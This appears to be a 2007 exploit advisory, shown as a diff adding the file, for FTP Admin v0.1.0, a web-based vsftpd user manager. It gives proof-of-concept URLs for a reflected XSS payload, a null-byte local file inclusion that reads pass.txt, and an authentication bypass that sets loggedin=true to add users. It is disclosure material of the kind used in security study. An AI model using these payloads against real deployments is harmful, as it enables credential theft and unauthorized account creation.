@@ -1,0 +1,70 @@
+FTP Admin v0.1.0 - MULTIPLE VULNERABILITIES
+	by Omni
+
+1) Infos
+---------
+Date            : 2007-11-28
+Product         : FTP Admin
+Version         : v0.1.0
+Vendor          : http://sourceforge.net/projects/ftpadmin/
+Vendor Status   : 2007-11-30 Informed!
+
+Description     : FTP admin is a web-based user administration tool, for usage in combination with vsftpd. FTP admin
+                  requires sudo. Features include modification of users and generation of user passwords.
+
+Source          : omnipresent - omni
+E-mail          : omnipresent[at]NOSPAMemail[dot]it - omni[at]NOSPAMplayhack[dot]net
+Team            : Playhack.net Security
+
+2) Security Issues
+-------------------
+
+--- [ XSS ] ---
+===============================================
+
+I think that is better let you see a PoC instead of explain where is the bug.. If you want to know it just look at the 
+source code.
+
+--- [ PoC ] ---
+===============
+
+http://localhost/ft/index.php?page=error&error=<b>...</b>
+http://localhost/ft/index.php?page=error&error=<script>alert(1)</script>
+
+
+--- [ Local File Inclusion ] ---
+================================
+
+Take a look in index.php, line 49:
+include("$page.php");
+
+Remembe that you have to log in to made local file inclusion (loggedin = true -> register_global = On)
+
+[ Remembe that ]
+if(!is_file($page . ".php") || (!is_readable($page . ".php"))) {
+		$page = "error";
+		$error = "Page does not exist or is not readable\n";
+	}
+}
+[ /Remembe that ]
+
+--- [ PoC ] ---
+===============
+
+http://localhost/ft/index.php?page=pass.txt%00&loggedin=true
+
+To see pass.txt ...
+
+--- [ Admin Bypass ] ---
+================================
+
+Today I'm too lazy to explain what's wrong.. so take a look in the source code and watch the var $loggedin !!
+
+--- [ PoC ] ---
+===============
+
+To add a user...
+
+http://localhost/ft/index.php?page=add&loggedin=true
+
+# milw0rm.com [2007-11-29]
